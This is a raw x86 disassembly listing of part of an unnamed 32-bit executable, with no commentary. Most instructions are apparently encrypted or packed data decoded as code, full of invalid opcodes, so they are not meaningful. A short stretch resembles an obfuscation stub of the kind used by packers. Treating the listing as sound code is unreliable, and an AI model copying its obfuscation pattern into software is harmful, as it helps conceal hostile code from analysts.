  40588a:	not    edx
  40588c:	in     eax,0xe7
  40588e:	jmp    0x40582d
  405890:	lock add al,0x5
  405893:	sub    BYTE PTR [ebx],dh
  405895:	jnp    0x4058e9
  405897:	int    0xe6
  405899:	pop    ebp
  40589a:	mov    bh,0x3b
  40589c:	outs   dx,BYTE PTR ds:[esi]
  40589d:	cli    
  40589e:	dec    esp
  40589f:	imul   edi,DWORD PTR [ecx-0x1c329723],0xffffff93
  4058a6:	or     ebp,DWORD PTR [eax]
  4058a8:	mov    DWORD PTR [ebp+0x7580a894],0x998128a6
  4058b2:	stos   DWORD PTR es:[edi],eax
  4058b3:	xor    BYTE PTR [ebx+0x36],bh
  4058b6:	aam    0x82
  4058b8:	dec    eax
  4058b9:	lahf   
  4058ba:	inc    esi
  4058bb:	(bad)  
  4058bc:	dec    edi
  4058bd:	sub    al,0x4e
  4058bf:	arpl   sp,bx
  4058c1:	xchg   ebp,eax
  4058c2:	aad    0x8e
  4058c4:	xchg   ebx,eax
  4058c5:	xor    DWORD PTR [ebx-0x3b],0x7c731d18
  4058cc:	fldenv [eax+0x7f]
  4058cf:	add    eax,0x2729c123
  4058d4:	add    bh,BYTE PTR [ebx+0x41640161]
  4058da:	outs   dx,BYTE PTR ds:[esi]
  4058db:	jne    0x4058c7
  4058dd:	imul   ecx,esi,0xacb5f262
  4058e3:	(bad)  
  4058e4:	sysenter 
  4058e6:	mov    DWORD PTR [esi],0xdebc9445
  4058ec:	push   ebx
  4058ed:	jb     0x40594a
  4058ef:	lods   eax,DWORD PTR ds:[esi]
  4058f0:	outs   dx,DWORD PTR ds:[esi]
  4058f1:	add    bl,BYTE PTR [esp+edx*1+0x55]
  4058f5:	jmp    0xf34:0x2585cbf4
  4058fc:	and    al,0xd2
  4058fe:	jmp    0x9886ecab
  405903:	push   ebp
  405904:	push   0x5f
  405906:	repz push 0xffffffdd
  405909:	xor    eax,0xb6f29dbb
  40590e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40590f:	dec    esi
  405910:	test   eax,0xb834667e
  405915:	rol    DWORD PTR [eax+0x23c66543],1
  40591b:	xor    DWORD PTR [eax+0x492c9923],edi
  405921:	fistp  DWORD PTR [edi+0x4]
  405924:	mov    edi,gs
  405926:	xchg   DWORD PTR [eax-0x697c0bc0],ebx
  40592c:	mov    eax,0x5d4c3f60
  405931:	dec    edx
  405932:	push   ds
  405933:	ds xchg ecx,eax
  405935:	push   esi
  405936:	xchg   edx,eax
  405937:	loopne 0x40594d
  405939:	sbb    edx,esi
  40593b:	cmp    eax,DWORD PTR [ebx]
  40593d:	mov    DWORD PTR [ecx+0x33],esp
  405940:	sub    ebp,DWORD PTR [ebx]
  405942:	pop    ebp
  405943:	fild   DWORD PTR [edx+edi*2-0x61703ed4]
  40594a:	mov    ds:0xc211425,eax
  40594f:	mov    ds:0x93498539,al
  405954:	test   DWORD PTR [ebx+ebp*8+0x6d],ecx
  405958:	sub    ah,al
  40595a:	pusha  
  40595b:	jge    0x405918
  40595d:	sti    
  40595e:	ffree  st(1)
  405960:	jns    0x4059aa
  405962:	jae    0x4059a7
  405964:	bnd jge 0x405969
  405967:	icebp  
  405968:	out    0x7c,al
  40596a:	push   esp
  40596b:	aad    0x9
  40596d:	inc    edx
  40596e:	push   ecx
  40596f:	xor    al,0xf6
  405971:	jnp    0x40593e
  405973:	mov    ah,0x82
  405975:	xchg   DWORD PTR [edx-0x7a8d6c80],esp
  40597b:	push   ebx
  40597c:	dec    edx
  40597d:	out    dx,eax
  40597e:	mov    eax,ds:0x647e2e13
  405983:	shl    DWORD PTR [ebx],0x24
  405986:	and    eax,0xf33a3448
  40598b:	cmp    DWORD PTR [edx-0x7a],0x262329f6
  405992:	jmp    0x52bb:0x34522efd
  405999:	fbld   TBYTE PTR [esp+ecx*1-0x54f376f5]
  4059a0:	ret    0x3ad1
  4059a3:	in     al,dx
  4059a4:	pop    esi
  4059a5:	inc    edx
  4059a6:	je     0x405a10
  4059a8:	(bad)  
  4059a9:	div    DWORD PTR [eax+0xc]
  4059ac:	mov    esi,0x9bed6992
  4059b1:	(bad)
  4059b5:	int3   
  4059b6:	sbb    bh,BYTE PTR es:[eax+0x0]
  4059ba:	shl    DWORD PTR [ecx],0x3f
  4059bd:	pop    ecx
  4059be:	mov    ch,0x22
  4059c0:	loop   0x405992
  4059c2:	push   ss
  4059c3:	or     esp,DWORD PTR ds:0x38354c6b
  4059c9:	xchg   BYTE PTR [edi+ecx*2+0x63],cl
  4059cd:	adc    bh,BYTE PTR cs:[eiz*4+0x4a5606d7]
  4059d5:	add    DWORD PTR [esi+0x55],eax
  4059d8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4059d9:	or     eax,DWORD PTR [ebp-0x39d6d142]
  4059df:	sbb    DWORD PTR [eax-0x2d],ecx
  4059e2:	mov    ss,WORD PTR [esi+0x263d3e89]
  4059e8:	lahf   
  4059e9:	pop    ebx
  4059ea:	dec    ebx
  4059eb:	idiv   BYTE PTR [edx-0x70c055bd]
  4059f1:	into   
  4059f2:	xor    eax,0x60f3b56b
  4059f7:	sbb    dh,dl
  4059f9:	ja     0x4059cb
  4059fb:	pop    ds
  4059fc:	sub    bl,BYTE PTR [eax-0x45]
  4059ff:	xchg   BYTE PTR [ecx+0x48],dh
  405a02:	adc    BYTE PTR [ecx],0xa5
  405a05:	mov    ebx,0x1db3242a
  405a0a:	repz mov ds:0x49affad2,eax
  405a10:	sar    DWORD PTR ds:[edx-0x5a8b4869],cl
  405a17:	xchg   esi,eax
  405a18:	call   FWORD PTR [ebx+0x5ae0c79b]
  405a1e:	sub    al,bl
  405a20:	sub    al,0xf4
  405a22:	mov    bh,0x1
  405a24:	xchg   ebx,eax
  405a25:	sahf   
  405a26:	bound  eax,QWORD PTR [ebx+0x60aa2e98]
  405a2c:	add    eax,0x66057132
  405a31:	jmp    0xb074:0xe11f92c2
  405a38:	mov    edx,0xf094216d
  405a3d:	mov    ch,dl
  405a3f:	popf   
  405a40:	adc    BYTE PTR [esi+0x3e95f85],ah
  405a46:	or     eax,0x3454d5f4
  405a4b:	push   ebx
  405a4c:	sbb    ebp,DWORD PTR [edi-0x27]
  405a4f:	xor    BYTE PTR [ebp+0x2c0055a3],0xe1
  405a56:	mov    eax,0xf9e82d58
  405a5b:	aas    
  405a5c:	ret    0x397f
  405a5f:	je     0x405a0b
  405a61:	sbb    DWORD PTR ds:0xeea075f2,edi
  405a67:	loopne 0x405aaf
  405a69:	xchg   esp,eax
  405a6a:	aaa    
  405a6b:	sti    
  405a6c:	rcl    ah,1
  405a6e:	add    al,0xea
  405a70:	mov    BYTE PTR [ecx+ebx*8],ch
  405a73:	mov    edi,0x90316eae
  405a78:	jae    0x405ae2
  405a7a:	cmc    
  405a7b:	pop    edi
  405a7c:	dec    esp
  405a7d:	std    
  405a7e:	adc    al,BYTE PTR [eax-0x653f4c5]
  405a84:	in     al,0x5b
  405a86:	mov    dh,0xc5
  405a88:	pop    ebx
  405a89:	inc    esp
  405a8a:	out    0xe8,eax
  405a8c:	mov    edx,0xd7393889
  405a91:	call   0x2fcd:0x4b4bdd9a
  405a98:	repnz inc eax
  405a9a:	call   0xaa6eecc8
  405a9f:	rcr    BYTE PTR [ebx],cl
  405aa1:	imul   eax,DWORD PTR [eax],0xffffff8b
  405aa4:	xchg   BYTE PTR [eax+0x4f],cl
  405aa7:	cmp    eax,eax
  405aa9:	popa   
  405aaa:	pusha  
  405aab:	repnz idiv DWORD PTR [edx+ebx*1-0x2e]
  405ab0:	pop    ss
  405ab1:	enter  0xd1eb,0x4b
  405ab5:	mov    sp,0xbaf5
  405ab9:	push   edx
  405aba:	xchg   dh,cl
  405abc:	adc    ebp,ebx
  405abe:	push   DWORD PTR [ecx]
  405ac0:	mov    ebp,0x568b9134
  405ac5:	pop    es
  405ac6:	jl     0x405b13
  405ac8:	les    ebp,FWORD PTR [esi]
  405aca:	xor    ebp,ebp
  405acc:	jg     0x405afe
  405ace:	mov    dh,0xa8
  405ad0:	cmp    BYTE PTR [esi-0xbd922c1],dh
  405ad6:	into   
  405ad7:	addr16 adc eax,0x282468e3
  405add:	sti    
  405ade:	fild   WORD PTR [eax+eax*8-0x728fc67a]
  405ae5:	and    al,0x9c
  405ae7:	xchg   edx,eax
  405ae8:	dec    ecx
  405ae9:	sub    DWORD PTR [edi+ebp*2-0x9d5d0b3],0x66
  405af1:	sbb    ebx,DWORD PTR [ebx+ecx*2]
  405af4:	mov    edi,0x9cd8b5ef
  405af9:	mov    DWORD PTR ds:0xb866678f,ebp
  405aff:	add    BYTE PTR [ebp-0xe],cl
  405b02:	in     eax,0x53
  405b04:	not    cl
  405b06:	dec    ebp
  405b07:	les    esi,FWORD PTR [ecx+0x274ee5ca]
  405b0d:	ss sub eax,0xdded9737
  405b13:	sti    
  405b14:	inc    esp
  405b15:	das    
  405b16:	enter  0x165e,0x67
  405b1a:	mov    ch,0x39
  405b1c:	addr16 pop ecx
  405b1e:	inc    esi
  405b1f:	adc    DWORD PTR [ebx],edx
  405b21:	adc    edx,DWORD PTR [ebp-0x13]
  405b24:	push   cs
  405b25:	xor    DWORD PTR [eax+0x1e],ecx
  405b28:	rol    DWORD PTR [ebp-0xe],0x7e
  405b2c:	stos   DWORD PTR es:[edi],eax
  405b2d:	scas   eax,DWORD PTR es:[edi]
  405b2e:	dec    esp
  405b2f:	and    al,0xc2
  405b31:	mov    al,ah
  405b33:	add    eax,0x8b677ec2
  405b38:	dec    ebp
  405b39:	lock sub DWORD PTR ds:0x42a266,0x42a2e2
  405b44:	xor    eax,esi
  405b46:	add    DWORD PTR ds:0x42a2ea,0x138
  405b50:	xor    ecx,esi
  405b52:	lea    ecx,[eax+ecx*1+0x64e5e2]
  405b59:	and    DWORD PTR ds:0x42a26a,0x0
  405b63:	xor    eax,eax
  405b65:	or     eax,DWORD PTR ds:0x42a26a
  405b6b:	inc    eax
  405b6c:	mov    ds:0x42a26a,eax
  405b71:	cmp    DWORD PTR ds:0x42a26a,0x7
  405b78:	jge    0x405bae
  405b7e:	jmp    0x405b89
  405b83:	call   DWORD PTR ds:0x42a3da
  405b89:	cmp    DWORD PTR ds:0x42a26a,0x6
  405b90:	jne    0x405ba1
  405b96:	mov    eax,ds:0x42a26a
  405b9b:	inc    eax
  405b9c:	mov    ds:0x42a26a,eax
  405ba1:	cmp    DWORD PTR ds:0x42a26a,0x11
  405ba8:	jb     0x405b63
  405bae:	mov    eax,DWORD PTR [ebp-0xc]
  405bb1:	sbb    DWORD PTR ds:0x42a2c6,0x42a2f6
  405bbb:	xor    edx,edx
  405bbd:	or     DWORD PTR ds:0x42a29e,0x16dc
  405bc7:	div    ecx
  405bc9:	or     eax,ecx
  405bcb:	mov    eax,DWORD PTR [ebp-0x8]
  405bce:	xor    ecx,ecx
  405bd0:	xor    ecx,DWORD PTR ds:0x42a292
  405bd6:	sbb    DWORD PTR ds:0x42a2fa,ecx
  405bdc:	mov    ecx,DWORD PTR [ebp-0x10]
  405bdf:	xor    eax,esi
  405be1:	or     DWORD PTR ds:0x42a2c2,0x42a29a
  405beb:	xor    ecx,esi
  405bed:	sbb    DWORD PTR ds:0x42a2be,0x52cd
  405bf7:	sub    eax,ecx
  405bf9:	cmp    edx,eax
  405bfb:	jmp    0x407f54
  405c00:	mov    esp,0x8265841a
  405c05:	loope  0x405ba5
  405c07:	add    BYTE PTR [eax+0x74],0x97
  405c0b:	es xchg esi,eax
  405c0d:	mov    eax,ds:0x390bb95d
  405c12:	add    DWORD PTR [ebx-0x7c7ca1b9],0xffffffb4
  405c19:	and    DWORD PTR [esi+0x333f11d1],eax
  405c1f:	cmp    eax,DWORD PTR [ecx-0x5d]
  405c22:	mov    edi,0x936ff133
  405c27:	loope  0x405bbf
  405c29:	adc    al,0x1f
  405c2b:	mov    edx,0xd9ba5f2b
  405c30:	test   eax,0xdbe1a547
  405c35:	or     ebp,DWORD PTR [esi]
  405c37:	icebp  
  405c38:	into   
  405c39:	mov    al,ds:0xaf915447
  405c3e:	add    eax,0x363655a5
  405c43:	daa    
  405c44:	cmp    bl,ah
  405c46:	repnz jecxz 0x405c64
  405c49:	adc    BYTE PTR [ebx+0xc71395a],cl
  405c4f:	adc    ebx,eax
  405c51:	in     eax,dx
  405c52:	ficom  WORD PTR [eax+eax*4+0x71]
  405c56:	fist   DWORD PTR [edi+ebp*1+0x56]
  405c5a:	mov    edx,eax
  405c5c:	xchg   ebp,eax
  405c5d:	sbb    BYTE PTR [eax],al
  405c5f:	pop    ecx
  405c60:	ja     0x405c95
  405c62:	lds    ecx,FWORD PTR [esi+0x21dab892]
  405c68:	fsub   QWORD PTR [eax]
  405c6a:	mov    WORD PTR [esi+ecx*4],?
  405c6d:	cdq    
  405c6e:	xchg   DWORD PTR [ecx],ecx
  405c70:	stc    
  405c71:	cmp    BYTE PTR [eax],ah
  405c73:	frstor ss:0x857aec2e
  405c7a:	popf   
  405c7b:	inc    esi
  405c7c:	ret    
  405c7d:	mov    ah,0xa3
  405c7f:	mov    edx,0xdd7d7ac5
  405c84:	xchg   DWORD PTR [ebp+0x4017e2],edx
  405c8a:	or     DWORD PTR gs:[ebx],eax
  405c8d:	xchg   BYTE PTR [eax+0x1b],bl
  405c90:	jns    0x405c7d
  405c92:	call   DWORD PTR ds:0xb57a6780
  405c98:	push   esi
  405c99:	cmc    
  405c9a:	in     al,dx
  405c9b:	mov    DWORD PTR [ebx+0x16],edx
  405c9e:	ret    0x446d
  405ca1:	nop
  405ca2:	pop    edi
  405ca3:	(bad)  
  405ca4:	jl     0x405d1b
  405ca6:	dec    esp
  405ca7:	scas   eax,DWORD PTR es:[edi]
  405ca8:	(bad)  
  405ca9:	ins    DWORD PTR es:[edi],dx
  405caa:	shl    DWORD PTR [ebp+0x72],cl
  405cad:	jbe    0x405cbc
  405caf:	retf   
  405cb0:	jne    0xe593a411
  405cb6:	loope  0x405cf1
  405cb8:	sub    al,0xaa
  405cba:	sbb    edx,DWORD PTR [ebx]
  405cbc:	mov    esp,0x2d8f9e58
  405cc1:	xchg   esp,eax
  405cc2:	mov    esi,0x9db896df
  405cc7:	cmp    DWORD PTR [edx],edx
  405cc9:	in     al,0xe6
  405ccb:	add    esi,DWORD PTR [ecx-0x77]
  405cce:	push   ecx
  405ccf:	call   0xd9e11ff3
  405cd4:	jg     0x405c80
  405cd6:	fwait
  405cd7:	les    ecx,FWORD PTR [eax-0x18]
  405cda:	jge    0x405cff
  405cdc:	lahf   
  405cdd:	mov    ecx,0xe1c11994
  405ce2:	or     bl,dh
  405ce4:	call   0xa152:0xa37072f3
  405ceb:	add    DWORD PTR [edx+0x26648bf6],eax
  405cf1:	(bad)  
  405cf3:	mov    BYTE PTR [eax-0x53],cl
  405cf6:	or     BYTE PTR [edx],bl
  405cf8:	sti    
  405cf9:	aaa    
  405cfa:	fcmovb st,st(4)
  405cfc:	jnp    0x405d42
  405cfe:	nop
  405cff:	or     eax,0x2caba2f0
  405d04:	jl     0x405d2f
  405d06:	aas    
  405d07:	ds adc cl,bh
  405d0a:	sbb    cl,BYTE PTR [ebx]
  405d0c:	cld    
  405d0d:	icebp  
  405d0e:	push   edi
  405d0f:	les    esi,FWORD PTR [ebx-0x7962e27f]
  405d15:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405d16:	in     al,dx
  405d17:	xchg   ebx,eax
  405d18:	pop    eax
  405d19:	xchg   esp,eax
  405d1a:	mov    ?,WORD PTR [ebx-0x7256563b]
  405d20:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405d21:	out    dx,eax
  405d22:	push   0xfc3b3c63
  405d27:	add    DWORD PTR [eax+eax*8-0x5bcaba56],esp
  405d2e:	cmp    eax,0x5c25b92d
  405d33:	cwde   
  405d34:	push   esp
  405d35:	cdq    
  405d36:	fwait
  405d37:	dec    edx
  405d38:	jge    0x405d9f
  405d3a:	in     eax,dx
  405d3b:	cmp    DWORD PTR [ecx+0x33ba40f2],0xffffffd7
  405d42:	mov    al,bl
  405d44:	stos   DWORD PTR es:[edi],eax
  405d45:	xchg   BYTE PTR [ecx-0x214f11bb],ch
  405d4b:	mov    esi,0xbe9b368a
  405d50:	mov    edi,0x69ed23cc
  405d55:	cmc    
  405d56:	(bad)  [ebp-0x35]
  405d59:	mov    WORD PTR [ebx+0x69],?
  405d5c:	pop    ebp
  405d5d:	dec    ebp
  405d5e:	outs   dx,BYTE PTR ds:[esi]
  405d5f:	in     al,0xe8
  405d61:	retf   
  405d62:	xchg   BYTE PTR [esi],bh
  405d64:	mov    eax,0x2745c9a9
  405d69:	or     dl,dl
  405d6b:	fidivr DWORD PTR [ebp-0x1e]
  405d6e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405d6f:	adc    DWORD PTR [edi+0x4e],eax
  405d72:	shr    BYTE PTR [esi],cl
  405d74:	push   0x21dd568e
  405d79:	dec    esp
  405d7a:	push   ebx
  405d7b:	arpl   WORD PTR [edx+0x44],bp
  405d7e:	fst    QWORD PTR [eax+0x7c]
  405d81:	outs   dx,DWORD PTR ds:[esi]
  405d82:	fs mov esi,0xbef55c48
  405d88:	sbb    BYTE PTR [eax+0x116b0f29],ah
  405d8e:	inc    ebx
  405d8f:	aaa    
  405d90:	dec    ebp
  405d91:	in     al,0x7c
  405d93:	cmp    dl,BYTE PTR [esi+0x6ff05ce]
  405d99:	push   cs
  405d9a:	shr    DWORD PTR [esi],1
  405d9c:	jne    0x405d1e
  405d9e:	sub    BYTE PTR [edi],ah
  405da0:	push   0x2b05702d
  405da5:	retf   
  405da6:	sbb    dl,BYTE PTR [edi+0x8]
  405da9:	call   0x8e74ff0b
  405dae:	ja     0x405d64
  405db0:	jle    0x405de8
  405db2:	jmp    0x59dd:0x8bebc4f4
  405db9:	rcr    DWORD PTR [edi],cl
  405dbb:	mov    ebp,0x4eee8d81
  405dc0:	ss mov ch,0xe7
  405dc3:	mov    edi,0x94b3c770
  405dc8:	xchg   esp,eax
  405dc9:	lds    ecx,FWORD PTR [eax]
  405dcb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405dcc:	mov    al,0x65
  405dce:	pop    ds
  405dcf:	int3   
  405dd0:	mov    cl,0xd8
  405dd2:	ds mov ebx,0xe686dba5
  405dd8:	inc    ebx
  405dd9:	in     eax,0xdf
  405ddb:	cmc    
  405ddc:	and    cl,ch
  405dde:	pop    esp
  405ddf:	lock into 
  405de1:	ins    BYTE PTR es:[edi],dx
  405de2:	jle    0x405e5b
  405de4:	in     eax,dx
  405de5:	cmp    BYTE PTR [edi],dh
  405de7:	jmp    0x378e:0xe795ad3d
  405dee:	jae    0x405e3f
  405df0:	mov    eax,0xab3af8c6
  405df5:	jge    0x405e60
  405df7:	fimul  DWORD PTR ds:[eax]
  405dfa:	fisub  DWORD PTR [ecx]
  405dfc:	pop    edi
  405dfd:	cmc    
  405dfe:	cli    
  405dff:	sub    bh,BYTE PTR [eax]
  405e01:	mov    edx,0x6845f059
  405e06:	adc    DWORD PTR [ecx-0x12],esp
  405e09:	lods   al,BYTE PTR ds:[esi]
  405e0a:	outs   dx,DWORD PTR ds:[esi]
  405e0b:	mov    al,BYTE PTR [ecx-0xd]
  405e0e:	xlat   BYTE PTR ds:[ebx]
  405e0f:	icebp  
  405e10:	test   al,0x56
  405e12:	imul   ecx,DWORD PTR ds:0x9730c820,0x63
  405e19:	push   ebp
  405e1a:	adc    DWORD PTR fs:[eax],0x69
  405e1e:	jecxz  0x405da9
  405e20:	lds    esp,FWORD PTR [edx-0xd142266]
  405e26:	jp     0x405e51
  405e28:	inc    DWORD PTR [ebx]
  405e2a:	fidiv  DWORD PTR [edx-0x61fcdae3]
  405e30:	pop    ebp
  405e31:	mov    ecx,DWORD PTR [esp+edi*4-0x2983feb7]
  405e38:	jecxz  0x405de9
  405e3a:	cmc    
  405e3b:	add    esi,DWORD PTR [ebx-0x66ab5ab4]
  405e41:	call   0x1cf:0x6e85a884
  405e48:	xchg   ebx,eax
  405e49:	es iret 
  405e4b:	xchg   ebp,eax
  405e4c:	push   ecx
  405e4d:	mov    ecx,ss
  405e4f:	inc    ebp
  405e50:	loop   0x405e96
  405e52:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405e53:	hlt    
  405e54:	daa    
  405e55:	push   esi
  405e56:	mov    ds:0x3dda9969,al
  405e5b:	inc    eax
  405e5c:	imul   edx,ebx,0x3a
  405e5f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405e60:	mov    ecx,0xef698579
  405e65:	push   ecx
  405e66:	jne    0x405ece
  405e68:	and    DWORD PTR [edx+0x73],ebx
  405e6b:	dec    esp
  405e6c:	xor    eax,0x5b23cb2
  405e71:	cdq    
  405e72:	dec    edi
  405e73:	push   ss
  405e74:	jl     0x405ee9
  405e76:	std    
  405e77:	cs inc edi
  405e79:	inc    edx
  405e7a:	cmp    eax,0xaaff3662
  405e7f:	jecxz  0x405ee1
  405e81:	adc    BYTE PTR [eax+0x6eb36e8e],bh
  405e87:	mov    esp,0x39b81915
  405e8c:	sbb    al,0x1
  405e8e:	repz push ss
  405e90:	imul   edi,DWORD PTR [edi+esi*8],0xffffff8a
  405e94:	jge    0x405e25
  405e96:	mov    esp,0x2ed5260a
  405e9b:	mov    eax,ds:0x848cda36
  405ea0:	push   es
  405ea1:	mov    ecx,ecx
  405ea3:	shl    bl,1
  405ea5:	fld    DWORD PTR [ebp+0x5af0c29b]
  405eab:	mov    eax,ebx
  405ead:	(bad)  
  405eae:	stos   BYTE PTR es:[edi],al
  405eaf:	push   eax
  405eb0:	or     al,0x54
  405eb2:	sub    al,0x89
  405eb4:	icebp  
  405eb5:	icebp  
  405eb6:	push   0xe1f69f75
  405ebb:	das    
  405ebc:	mov    bh,0xe0
  405ebe:	test   DWORD PTR [esi+0x2c],edx
  405ec1:	(bad)  
  405ec2:	pop    eax
  405ec3:	mov    ah,0x6d
  405ec5:	sub    al,0xf0
  405ec7:	(bad)  
  405ec9:	dec    edx
  405eca:	mov    edi,0x10559524
  405ecf:	mov    bh,BYTE PTR [ecx+0x7fa8d625]
  405ed5:	dec    ecx
  405ed6:	and    eax,DWORD PTR [ecx]
  405ed8:	daa    
  405ed9:	mov    bh,0x38
  405edb:	fs mov edx,0xc9d721c5
  405ee1:	or     al,0xf9
  405ee3:	aam    0xb1
  405ee5:	bound  eax,QWORD PTR [ebp+0x7]
  405ee8:	xchg   esi,eax
  405ee9:	nop
  405eea:	jg     0x405f62
  405eec:	repnz cmp al,0xc1
  405eef:	cld    
  405ef0:	jp     0x405ef0
  405ef2:	dec    edx
  405ef3:	pop    esi
  405ef4:	xor    al,0x36
  405ef6:	das    
  405ef7:	dec    eax
  405ef8:	fistp  DWORD PTR [ecx-0x841f19]
  405efe:	addr16 mov esi,0x3f720b9d
  405f04:	stc    
  405f05:	pop    esi
  405f06:	or     edx,esi
  405f08:	xchg   esp,eax
  405f09:	or     al,0xa9
  405f0b:	or     bh,cl
  405f0d:	daa    
  405f0e:	popf   
  405f0f:	clc    
  405f10:	push   eax
  405f11:	test   al,0x1b
  405f13:	(bad)  
  405f14:	mov    ecx,0xe48086e
  405f19:	fnstenv [ecx-0x697e0a22]
  405f1f:	dec    esi
  405f20:	adc    al,0xd
  405f22:	push   es
  405f23:	(bad)  
  405f24:	jmp    0x6306:0x8f144c4a
  405f2b:	or     eax,0xc118162f
  405f30:	push   ecx
  405f31:	add    edi,eax
  405f33:	sahf   
  405f34:	test   eax,0x98971d2a
  405f39:	inc    edi
  405f3a:	sub    eax,0x6564ee90
  405f3f:	adc    dl,BYTE PTR [ebx+0x4cd78e7]
  405f45:	adc    al,0x49
  405f47:	adc    eax,0xb28191ea
  405f4c:	(bad)  
  405f4d:	mov    ebx,0xf9f67df6
  405f52:	xor    al,BYTE PTR [esi]
  405f54:	nop
  405f55:	pushf  
  405f56:	into   
  405f57:	jno    0x405f99
  405f59:	fs lock cli 
  405f5c:	outs   dx,BYTE PTR ds:[esi]
  405f5d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405f5e:	ins    DWORD PTR es:[edi],dx
  405f5f:	les    edi,FWORD PTR [ebx+eiz*4-0x7043f056]
  405f66:	xchg   BYTE PTR ds:0x90ba032,bl
  405f6c:	inc    eax
  405f6d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405f6e:	and    al,0x87
  405f70:	xor    BYTE PTR [ebx],dh
  405f72:	adc    ebp,DWORD PTR [ecx+0x48]
  405f75:	inc    ecx
  405f76:	push   edx
  405f77:	nop
  405f78:	imul   edi,edx,0x957c5f4f
  405f7e:	mov    bh,al
  405f80:	es in  al,dx
  405f82:	xor    edx,DWORD PTR [edx+0x58]
  405f85:	dec    ecx
  405f86:	jecxz  0x405f24
  405f88:	(bad)  
  405f89:	clc    
  405f8a:	test   al,0x63
  405f8c:	stc    
  405f8d:	push   0x2b29eefc
  405f92:	xchg   DWORD PTR [ebx+0x6ff13d0b],ecx
  405f98:	int    0x1f
  405f9a:	xchg   ebx,eax
  405f9b:	cmp    eax,0xd50c615e
  405fa0:	scas   eax,DWORD PTR es:[edi]
  405fa1:	jbe    0x405fa8
  405fa3:	adc    BYTE PTR ds:0x79a41020,0xae
  405faa:	in     al,0xe2
  405fac:	xchg   BYTE PTR [ebx],dh
  405fae:	xchg   ebx,eax
  405faf:	loop   0x405f51
  405fb1:	mov    esp,0xa4ff87c
  405fb6:	inc    eax
  405fb7:	cmp    al,0xa0
  405fb9:	(bad)  
  405fbb:	test   al,0xb4
  405fbd:	int3   
  405fbe:	adc    ch,cl
  405fc0:	push   esi
  405fc1:	xchg   edi,eax
  405fc2:	inc    edi
  405fc3:	ins    DWORD PTR es:[edi],dx
  405fc4:	sbb    ebx,DWORD PTR [ebx+edi*1-0x48d24b78]
  405fcb:	mov    ah,0x4e
  405fcd:	push   esi
  405fce:	xchg   esp,eax
  405fcf:	cdq    
  405fd0:	fdiv   DWORD PTR [edx+0x526611cb]
  405fd6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405fd7:	push   edx
  405fd8:	xor    al,cl
  405fda:	adc    DWORD PTR [edx],ebx
  405fdc:	mov    ds:0xf96dbd13,al
  405fe1:	xor    dh,bh
  405fe3:	mov    esi,0xdd55affb
  405fe8:	lock dec ebx
  405fea:	pop    es
  405feb:	push   esi
  405fec:	jbe    0x405fd6
  405fee:	sub    edi,DWORD PTR [esi+0x259378f6]
  405ff4:	mov    eax,ds:0xebb35963
  405ff9:	fscale 
  405ffb:	aam    0xb7
  405ffd:	dec    ebp
  405fff:	hlt    
  406000:	cmp    al,0x64
  406002:	in     eax,0x80
  406004:	or     eax,DWORD PTR [ebp-0x2acb2c66]
  40600a:	ja     0x40601a
  40600c:	or     ebp,0x28779405
  406012:	and    esp,ebp
  406014:	aam    0x12
  406016:	sti    
  406017:	mov    bl,0x2f
  406019:	sbb    BYTE PTR [eax-0x116d4878],cl
  40601f:	pop    ss
  406020:	fisubr DWORD PTR [edi-0x5a73eedf]
  406026:	add    esp,DWORD PTR [edx+0x7c2803d4]
  40602c:	sbb    ah,ah
  40602e:	arpl   WORD PTR [ebx+0x6d0622c],ax
  406034:	pop    ss
  406035:	or     DWORD PTR [eax],edi
  406037:	std    
  406038:	mov    ah,al
  40603a:	ins    DWORD PTR es:[edi],dx
  40603b:	jno    0x40602c
  40603d:	sub    al,al
  40603f:	or     ah,0xb7
  406042:	loopne 0x40606a
  406044:	test   esi,0xf16345eb
  40604a:	out    dx,eax
  40604b:	sti    
  40604c:	imul   DWORD PTR [ecx+0x4460745e]
  406052:	mov    ch,0x60
  406054:	pop    ebp
  406055:	pop    eax
  406056:	daa    
  406057:	inc    edx
  406058:	rcr    DWORD PTR [ebx-0x45],1
  40605b:	push   ds
  40605c:	das    
  40605d:	inc    esi
  40605e:	repz loope 0x40600d
  406061:	mov    ecx,DWORD PTR [eax]
  406063:	repnz mov esp,0x7e86f6dc
  406069:	pop    ss
  40606a:	mov    ds:0xc96e0b6a,eax
  40606f:	jo     0x406026
  406071:	outs   dx,BYTE PTR ds:[esi]
  406072:	cmc    
  406073:	or     BYTE PTR [edx+esi*4],ch
  406076:	jbe    0x406059
  406078:	sbb    al,0xf4
  40607a:	cmp    al,BYTE PTR [ebp+eiz*1-0x24]
  40607e:	in     eax,0x97
  406080:	xchg   ebx,eax
  406081:	sbb    dh,BYTE PTR [ebp+0x48]
  406084:	xlat   BYTE PTR ds:[ebx]
  406085:	call   FWORD PTR [ecx]
  406087:	fstp   TBYTE PTR [edx+0x9]
  40608a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40608b:	jecxz  0x40605f
  40608d:	shl    ebx,cl
  40608f:	pusha  
  406090:	loopne 0x40603a
  406092:	adc    eax,0xc9e6b503
  406097:	mov    ds:0xa0f8b8ed,eax
  40609c:	(bad)  
  40609d:	mov    DWORD PTR [esi+0x6b3c099e],esp
  4060a3:	add    BYTE PTR [esi-0x600dc65a],al
  4060a9:	not    DWORD PTR [esi]
  4060ab:	push   esi
  4060ac:	pop    ebp
  4060ad:	ret    0x45f
  4060b0:	mov    ebx,0xc0a1dc94
  4060b5:	aad    0x8c
  4060b7:	jno    0x4060a8
  4060b9:	adc    eax,0x818c8fa7
  4060be:	cmp    al,BYTE PTR [eax+edx*2+0x4]
  4060c2:	jne    0x4060cd
  4060c4:	pushf  
  4060c5:	sti    
  4060c6:	mov    esi,0x28d55f2a
  4060cb:	sbb    DWORD PTR [esi+0x6eabab86],ebp
  4060d1:	and    edx,ecx
  4060d3:	lds    esi,FWORD PTR [ebx-0x60e13208]
  4060d9:	jg     0x4060bf
